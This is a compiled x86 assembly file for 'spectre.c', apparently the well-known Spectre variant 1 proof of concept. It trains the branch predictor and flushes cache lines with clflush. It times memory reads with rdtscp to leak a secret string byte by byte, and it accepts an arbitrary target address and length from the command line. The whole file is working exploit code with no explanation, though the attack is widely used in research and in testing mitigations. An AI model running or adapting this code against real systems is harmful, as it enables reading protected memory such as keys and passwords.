	.file	"spectre.c"
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array2
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	secret
	.section	.rodata
	.align 4
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.local	results
	.comm	results,1024,32
	.text
	.globl	check
	.type	check, @function
check:
.LFB4271:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	array1_size@GOTOFF(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jnb	.L2
	movl	$1, %eax
	jmp	.L3
.L2:
	movl	$0, %eax
.L3:
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4271:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4272:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	subl	$16, %esp
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	array1_size@GOTOFF(%eax), %edx
	cmpl	%edx, 8(%ebp)
	jnb	.L8
	movl	8(%ebp), %edx
	subl	$1, %edx
	movl	%edx, -4(%ebp)
	jmp	.L6
.L7:
	leal	array1@GOTOFF(%eax), %ecx
	movl	-4(%ebp), %edx
	addl	%ecx, %edx
	movzbl	(%edx), %edx
	movzbl	%dl, %edx
	sall	$9, %edx
	movzbl	array2@GOTOFF(%eax,%edx), %ecx
	movzbl	temp@GOTOFF(%eax), %edx
	andl	%ecx, %edx
	movb	%dl, temp@GOTOFF(%eax)
	subl	$1, -4(%ebp)
.L6:
	cmpl	$0, -4(%ebp)
	jns	.L7
.L8:
	nop
	leave
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4272:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4273:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$92, %esp
	.cfi_offset 7, -12
	.cfi_offset 6, -16
	.cfi_offset 3, -20
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	movl	12(%ebp), %eax
	movl	%eax, -92(%ebp)
	movl	16(%ebp), %eax
	movl	%eax, -96(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	xorl	%eax, %eax
	movl	$0, -80(%ebp)
	movl	$0, -68(%ebp)
	jmp	.L10
.L11:
	movl	-68(%ebp), %eax
	movl	$0, results@GOTOFF(%ebx,%eax,4)
	addl	$1, -68(%ebp)
.L10:
	cmpl	$255, -68(%ebp)
	jle	.L11
	movl	$999, -72(%ebp)
	jmp	.L12
.L24:
	movl	$0, -68(%ebp)
	jmp	.L13
.L14:
	movl	-68(%ebp), %eax
	sall	$9, %eax
	movl	%eax, %edx
	leal	array2@GOTOFF(%ebx), %eax
	addl	%edx, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	clflush	(%eax)
	nop
	addl	$1, -68(%ebp)
.L13:
	cmpl	$255, -68(%ebp)
	jle	.L14
	movl	array1_size@GOTOFF(%ebx), %ecx
	movl	-72(%ebp), %eax
	cltd
	idivl	%ecx
	movl	%edx, %eax
	movl	%eax, -60(%ebp)
	movl	$29, -64(%ebp)
	jmp	.L15
.L18:
	leal	array1_size@GOTOFF(%ebx), %eax
	movl	%eax, -40(%ebp)
	movl	-40(%ebp), %eax
	clflush	(%eax)
	nop
	movl	$0, -76(%ebp)
	jmp	.L16
.L17:
	movl	-76(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -76(%ebp)
.L16:
	movl	-76(%ebp), %eax
	cmpl	$99, %eax
	jle	.L17
	movl	-64(%ebp), %ecx
	movl	$715827883, %edx
	movl	%ecx, %eax
	imull	%edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%edx), %eax
	movw	$0, %ax
	movl	%eax, -48(%ebp)
	movl	-48(%ebp), %eax
	shrl	$16, %eax
	orl	%eax, -48(%ebp)
	movl	8(%ebp), %eax
	xorl	-60(%ebp), %eax
	andl	-48(%ebp), %eax
	xorl	-60(%ebp), %eax
	movl	%eax, -48(%ebp)
	pushl	-48(%ebp)
	call	victim_function
	addl	$4, %esp
	subl	$1, -64(%ebp)
.L15:
	cmpl	$0, -64(%ebp)
	jns	.L18
	movl	$0, -68(%ebp)
	jmp	.L19
.L23:
	movl	-68(%ebp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	sall	$9, %eax
	movl	%eax, %edx
	leal	array2@GOTOFF(%ebx), %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	leal	-80(%ebp), %eax
	movl	%eax, -32(%ebp)
	rdtscp
	movl	%ecx, %esi
	movl	-32(%ebp), %ecx
	movl	%esi, (%ecx)
	movl	%eax, -104(%ebp)
	movl	%edx, -100(%ebp)
	movl	-52(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -80(%ebp)
	leal	-80(%ebp), %eax
	movl	%eax, -36(%ebp)
	rdtscp
	movl	%ecx, %esi
	movl	-36(%ebp), %ecx
	movl	%esi, (%ecx)
	movl	%eax, %esi
	movl	%edx, %edi
	subl	-104(%ebp), %esi
	sbbl	-100(%ebp), %edi
	movl	$50, %edx
	movl	$0, %eax
	cmpl	%esi, %edx
	sbbl	%edi, %eax
	jc	.L22
	movl	array1_size@GOTOFF(%ebx), %ecx
	movl	-72(%ebp), %eax
	cltd
	idivl	%ecx
	movl	%edx, %eax
	movzbl	array1@GOTOFF(%ebx,%eax), %eax
	movzbl	%al, %eax
	cmpl	%eax, -56(%ebp)
	je	.L22
	movl	-56(%ebp), %eax
	movl	results@GOTOFF(%ebx,%eax,4), %eax
	leal	1(%eax), %edx
	movl	-56(%ebp), %eax
	movl	%edx, results@GOTOFF(%ebx,%eax,4)
.L22:
	addl	$1, -68(%ebp)
.L19:
	cmpl	$255, -68(%ebp)
	jle	.L23
	subl	$1, -72(%ebp)
.L12:
	cmpl	$0, -72(%ebp)
	jg	.L24
	movl	results@GOTOFF(%ebx), %eax
	movl	%eax, %edx
	movl	-80(%ebp), %eax
	xorl	%edx, %eax
	movl	%eax, results@GOTOFF(%ebx)
	nop
	movl	-28(%ebp), %eax
	subl	%gs:20, %eax
	je	.L25
	call	__stack_chk_fail_local
.L25:
	leal	-12(%ebp), %esp
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%edi
	.cfi_restore 7
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4273:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
	.align 4
.LC1:
	.string	"Putting '%s' in memory, address %p\n"
.LC2:
	.string	"%p"
.LC3:
	.string	"%d"
	.align 4
.LC4:
	.string	"Trying malicious_x = %p, len = %d\n"
.LC5:
	.string	"Reading %d bytes:\n"
	.align 4
.LC6:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
.LC7:
	.string	"result[%d]=%d "
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4274:
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	movl	%esp, %ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	pushl	%esi
	pushl	%ebx
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x74,0x6
	.cfi_escape 0x10,0x6,0x2,0x75,0x7c
	.cfi_escape 0x10,0x3,0x2,0x75,0x78
	subl	$92, %esp
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	movl	%ecx, %esi
	movl	4(%esi), %eax
	movl	%eax, -92(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	xorl	%eax, %eax
.L40:
	call	getchar@PLT
	movb	%al, -73(%ebp)
	cmpb	$114, -73(%ebp)
	jne	.L27
	movl	secret@GOTOFF(%ebx), %edx
	movl	secret@GOTOFF(%ebx), %eax
	subl	$4, %esp
	pushl	%edx
	pushl	%eax
	leal	.LC1@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	secret@GOTOFF(%ebx), %eax
	leal	array1@GOTOFF(%ebx), %edx
	subl	%edx, %eax
	movl	%eax, -72(%ebp)
	movl	secret@GOTOFF(%ebx), %eax
	subl	$12, %esp
	pushl	%eax
	call	strlen@PLT
	addl	$16, %esp
	movl	%eax, -68(%ebp)
	movl	$0, -64(%ebp)
	jmp	.L28
.L29:
	leal	array2@GOTOFF(%ebx), %edx
	movl	-64(%ebp), %eax
	addl	%edx, %eax
	movb	$1, (%eax)
	addl	$1, -64(%ebp)
.L28:
	cmpl	$131071, -64(%ebp)
	jbe	.L29
	cmpl	$3, (%esi)
	jne	.L30
	movl	-92(%ebp), %eax
	addl	$4, %eax
	movl	(%eax), %eax
	subl	$4, %esp
	leal	-72(%ebp), %edx
	pushl	%edx
	leal	.LC2@GOTOFF(%ebx), %edx
	pushl	%edx
	pushl	%eax
	call	__isoc99_sscanf@PLT
	addl	$16, %esp
	movl	-72(%ebp), %eax
	leal	array1@GOTOFF(%ebx), %edx
	subl	%edx, %eax
	movl	%eax, -72(%ebp)
	movl	-92(%ebp), %eax
	addl	$8, %eax
	movl	(%eax), %eax
	subl	$4, %esp
	leal	-68(%ebp), %edx
	pushl	%edx
	leal	.LC3@GOTOFF(%ebx), %edx
	pushl	%edx
	pushl	%eax
	call	__isoc99_sscanf@PLT
	addl	$16, %esp
	movl	-68(%ebp), %eax
	movl	-72(%ebp), %edx
	subl	$4, %esp
	pushl	%eax
	pushl	%edx
	leal	.LC4@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
.L30:
	movl	-68(%ebp), %eax
	subl	$8, %esp
	pushl	%eax
	leal	.LC5@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	$0, -60(%ebp)
	jmp	.L31
.L35:
	movl	secret@GOTOFF(%ebx), %edx
	movl	-60(%ebp), %eax
	addl	%edx, %eax
	movzbl	(%eax), %eax
	movsbl	%al, %edx
	movl	secret@GOTOFF(%ebx), %ecx
	movl	-60(%ebp), %eax
	addl	%ecx, %eax
	movzbl	(%eax), %eax
	movsbl	%al, %eax
	movl	-72(%ebp), %ecx
	pushl	%edx
	pushl	%eax
	pushl	%ecx
	leal	.LC6@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	addl	$1, -60(%ebp)
	movl	-72(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -72(%ebp)
	subl	$4, %esp
	leal	-40(%ebp), %edx
	pushl	%edx
	leal	-30(%ebp), %edx
	pushl	%edx
	pushl	%eax
	call	readMemoryByte
	addl	$16, %esp
	movl	results@GOTOFF(%ebx), %eax
	movl	%eax, -52(%ebp)
	movl	$1, -56(%ebp)
	jmp	.L32
.L34:
	movl	-56(%ebp), %eax
	subl	$1, %eax
	movl	results@GOTOFF(%ebx,%eax,4), %eax
	movl	%eax, -48(%ebp)
	movl	-56(%ebp), %eax
	movl	results@GOTOFF(%ebx,%eax,4), %eax
	movl	%eax, -44(%ebp)
	movl	-48(%ebp), %eax
	cmpl	-44(%ebp), %eax
	jle	.L33
	movl	-48(%ebp), %eax
	subl	-44(%ebp), %eax
	cmpl	$100, %eax
	jle	.L33
	movl	-56(%ebp), %eax
	subl	$1, %eax
	movl	results@GOTOFF(%ebx,%eax,4), %eax
	movl	-56(%ebp), %edx
	subl	$1, %edx
	subl	$4, %esp
	pushl	%eax
	pushl	%edx
	leal	.LC7@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	-56(%ebp), %eax
	movl	results@GOTOFF(%ebx,%eax,4), %eax
	subl	$4, %esp
	pushl	%eax
	pushl	-56(%ebp)
	leal	.LC7@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
.L33:
	addl	$1, -56(%ebp)
.L32:
	cmpl	$255, -56(%ebp)
	jle	.L34
	subl	$12, %esp
	pushl	$10
	call	putchar@PLT
	addl	$16, %esp
.L31:
	movl	-68(%ebp), %eax
	subl	$1, %eax
	movl	%eax, -68(%ebp)
	movl	-68(%ebp), %eax
	testl	%eax, %eax
	jns	.L35
	jmp	.L40
.L27:
	cmpb	$10, -73(%ebp)
	je	.L43
	cmpb	$105, -73(%ebp)
	jne	.L44
	call	getpid@PLT
	movl	%eax, %ecx
	leal	check@GOTOFF(%ebx), %eax
	cltd
	addl	$33, %eax
	adcl	$0, %edx
	pushl	%ecx
	pushl	%edx
	pushl	%eax
	leal	.LC8@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	jmp	.L40
.L43:
	nop
	jmp	.L40
.L44:
	nop
	movl	$0, %eax
	movl	-28(%ebp), %edx
	subl	%gs:20, %edx
	je	.L42
	call	__stack_chk_fail_local
.L42:
	leal	-12(%ebp), %esp
	popl	%ecx
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4274:
	.size	main, .-main
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB4275:
	.cfi_startproc
	movl	(%esp), %eax
	ret
	.cfi_endproc
.LFE4275:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB4276:
	.cfi_startproc
	movl	(%esp), %ebx
	ret
	.cfi_endproc
.LFE4276:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
